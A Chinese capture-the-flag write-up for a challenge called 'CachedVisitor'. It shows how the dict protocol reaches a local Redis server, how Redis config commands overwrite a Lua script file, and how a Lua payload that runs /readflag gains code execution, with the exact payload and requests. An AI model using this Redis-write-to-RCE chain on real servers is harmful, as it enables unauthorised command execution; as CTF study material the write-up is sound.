# CachedVisitor

部分有用的测试：

![image-20250105212127679](.\img\image-20250105212127679.png)

![image-20250105212656356](.\img\image-20250105212656356.png)

![image-20250105212729838](.\img\image-20250105212729838.png)

容器出网且可读取文件

dict协议可用，可访问redis

分析了一下源代码

```main.lua```从```visit.script```中读取```\##LUA_START##```和```##LUA_END##```之间的内容作为脚本运行

```dockerfile
COPY flag /flag
COPY readflag /readflag
RUN chmod 400 /flag
RUN chmod +xs /readflag
```

flag设置了权限无法直接读取

尝试使用redis写visit.script进行RCE

在本地docker编写lua测试可以输出flag

```lua
##LUA_START##ngx.say(io.popen('/readflag'):read('*all'))##LUA_END##
```

直接使用redis将lua写入visit.script

```
dict://127.0.0.1:6379/set:payload:"##LUA_START##ngx.say(io.popen('/readflag'):read('*all'))##LUA_END##"
dict://127.0.0.1:6379/config:set:dir:/scripts/
dict://127.0.0.1:6379/config:set:dbfilename:visit.script
dict://127.0.0.1:6379/bgsave
```

写入之后随意发送一个请求即可执行我们写入的脚本

> ```dart{dc2e4048-dca7-4fa3-9803-8ee9d785af2b}```